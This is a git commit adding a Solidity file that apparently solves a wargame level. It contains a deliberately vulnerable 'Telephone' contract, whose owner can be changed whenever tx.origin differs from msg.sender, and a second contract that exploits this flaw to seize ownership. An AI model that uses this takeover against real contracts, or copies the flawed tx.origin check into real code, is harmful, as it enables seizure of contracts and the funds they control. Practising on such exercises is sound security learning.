2d75c22be16d678c07411c13d7d665d26985ef85
Sam Morozov <109150200+sammorozov@users.noreply.github.com>
2024-03-18 13:30:36 +0300

    Add files via upload

---
+++ tel.sol
@@ -0,0 +1,29 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Telephone {
+
+  address public owner;
+
+  constructor() {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+
+contract My{
+    Telephone public telephone;
+    constructor(address _telephone){
+        telephone = Telephone(_telephone);
+    }
+
+    function change() external {
+        telephone.changeOwner(tx.origin);
+    }
+
+}
